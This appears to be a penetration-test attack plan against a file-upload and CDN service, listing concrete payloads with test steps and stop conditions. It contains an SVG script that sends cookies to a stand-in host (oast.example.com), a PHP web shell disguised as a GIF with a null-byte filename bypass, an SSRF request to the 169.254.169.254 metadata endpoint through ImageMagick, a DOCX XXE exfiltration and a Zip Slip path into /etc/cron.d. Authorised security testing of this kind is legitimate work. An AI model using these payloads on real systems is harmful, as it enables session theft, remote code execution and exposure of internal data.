attack_vectors.test_payload: Upload file with filename='xss.svg' and Content-Type='image/svg+xml'. File content: <?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://oast.example.com/?c='+document.cookie)</script></svg>

Upload file with filename='shell.php.jpg' and Content-Type='image/jpeg'. File content: GIF89a<?php system($_GET['cmd']); ?> (GIF magic bytes prepended to PHP payload). If server strips extension suffix, try filename='shell.php%00.jpg'.

Upload file with filename='report.pdf' and Content-Type='application/pdf'. File content is valid HTML: <html><body><script>alert(document.domain)</script></body></html>. If CDN serves without Content-Type override, browser sniffs as text/html.
Upload any file as Account_A. Capture returned UUID. Attempt retrieval of https://cdn.example.com/attachments/{uuid} as Account_B (no session cookie) — no signed URL or auth check on CDN.

Upload SVG file with embedded ImageMagick delegate instruction: <svg><image href="http://169.254.169.254/latest/meta-data/"/></svg> as Content-Type image/svg+xml. Thumbnail generator invokes ImageMagick or librsvg which may issue the SSRF.

test_steps: Upload any file as Account_A; capture the attachment_id UUID from the 201 response.
In a separate session as Account_B (different user, no sharing relationship), fetch https://cdn.example.com/attachments/{captured_uuid} directly.
Proof of bypass: CDN returns 200 with Account_A's file content, confirming no authorization check on the unsigned CDN URL.

async_processing.trigger: Upload of image/* or application/pdf content type; thumbnail_url field appears ~2s after upload
async_processing.attack_note: Thumbnail generator (likely ImageMagick or Pillow) processes the uploaded file in a privileged context. SVG uploads with embedded HTTP references or MSL/MVG directives can trigger SSRF or RCE via ImageMagick delegate rules (CVE-2016-3714 class). PDF uploads may trigger ghostscript. Upload a crafted SVG with <image href='http://internal-metadata/'/> and poll the thumbnail_url to detect SSRF via response timing or OOB DNS callback.

async_processing.trigger: Upload of .docx or application/vnd.openxmlformats-officedocument.wordprocessingml.document; preview iframe visible in UI
async_processing.attack_note: DOCX is a ZIP archive. Embed an XXE payload in word/document.xml referencing an external entity pointing to an internal service. The preview renderer (LibreOffice, unoconv, or similar) may resolve the external entity and exfiltrate content. Also test for Zip Slip: use a filename like ../../etc/cron.d/evil inside the archive.

stop_conditions: Account_B receives 200 response with Account_A's file content via the CDN URL with no session token — this is sufficient proof of insecure direct object reference on CDN layer
OOB DNS or HTTP callback received at oast.example.com after uploading SVG with fetch() or ImageMagick delegate payload — proves XSS or SSRF respectively
SVG served by CDN with Content-Type image/svg+xml causes JavaScript execution in victim browser when iframe preview loads it — proves stored XSS
summary: Unsigned CDN URLs expose all attachments to unauthenticated cross-user retrieval; SVG upload with preserved filename served from same CDN origin achieves stored XSS; async thumbnail generator is an ImageMagick SSRF surface
